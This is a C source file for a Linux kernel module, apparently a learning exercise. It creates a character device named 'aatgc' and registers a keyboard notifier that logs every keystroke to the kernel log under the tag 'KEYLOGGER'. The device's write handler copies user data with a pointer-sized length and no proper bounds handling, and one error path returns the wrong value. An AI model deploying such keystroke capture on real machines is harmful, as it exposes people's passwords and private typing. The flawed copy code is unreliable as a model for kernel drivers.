#include <linux/init.h>           // Macros used to mark up functions e.g. __init __exit
//#include<../linux/linux-4.10.1/include/linux/init.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/device.h>
#include<asm/uaccess.h>
#include<linux/keyboard.h>

struct class *charClass;
struct device *charDevice;
int majorNum;

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) 
{
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;
  
  int ret = NOTIFY_OK;
  
  if (code == KBD_KEYCODE) {
    printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
  }  
  return 0;
}
struct notifier_block nb = {
   .notifier_call = hello_notify
};

int deviceOpen (struct inode *id, struct file *fp)
{
	printk("Open device success \n");
	return 0;
}

int deviceClose (struct inode *id, struct file *fp)
{
	printk("Close device success \n");
	return 0;
}
ssize_t deviceRead (struct file *fp, char __user *usr, size_t size, loff_t *off)
{
	printk("Read device success \n");
	copy_to_user(usr,"aatgc",5);
	return 0;
}
ssize_t deviceWrite (struct file *fp, const char __user *usr, size_t size, loff_t *off)
{
	char buff[256];
	printk("Write device success \n");
	copy_from_user(buff,usr,sizeof(usr));
	printk("User buff = %s \n",buff);
	return 0;
}

struct file_operations fops={
	.open = deviceOpen,
	.release = deviceClose,
	.read = deviceRead,
	.write = deviceWrite
};

int __init charInit(void)
{

	int input = 0;
	int oldinput=0; 
	majorNum = register_chrdev(0,"aatgc",&fops);
	if(majorNum < 0)
	{
		printk("getting Major number failed \n");
		return majorNum;
	}
	printk(" init decice AATCH major num = %d\n",majorNum);
	
	charClass = class_create(THIS_MODULE,"aatgc_class");
	if(IS_ERR(charClass))
	{
		unregister_chrdev(majorNum, "aatgc");
		printk("create class failed \n");
		return PTR_ERR(charClass);
	}
	printk(" init decice AATCH major num = %d\n",majorNum);

	charDevice = device_create(charClass, NULL, MKDEV(majorNum, 0), NULL, "aatgc");
	if(IS_ERR(charDevice))
	{
		class_destroy(charClass);
		unregister_chrdev(majorNum, "aatgc");
		printk("create class failed \n");
		return PTR_ERR(charClass);
	}
	printk("Create device successful \n");
	//oldinput=input; 
	input=inb(0x60); 
	if (oldinput!=input)
	{
		printk("GOT INPUT\n");
	}
	printk("Create device successful 2 \n");
	register_keyboard_notifier(&nb);
	printk("Create device successful 3 \n");
	return 0;
}

void __exit charExit(void)
{
	device_destroy(charClass,MKDEV(majorNum,0));
	class_destroy(charClass);
	unregister_chrdev(majorNum, "aatgc");
	unregister_keyboard_notifier(&nb);
	printk("device exit successful \n");
}

module_init(charInit);
module_exit(charExit);

MODULE_LICENSE("GPL");
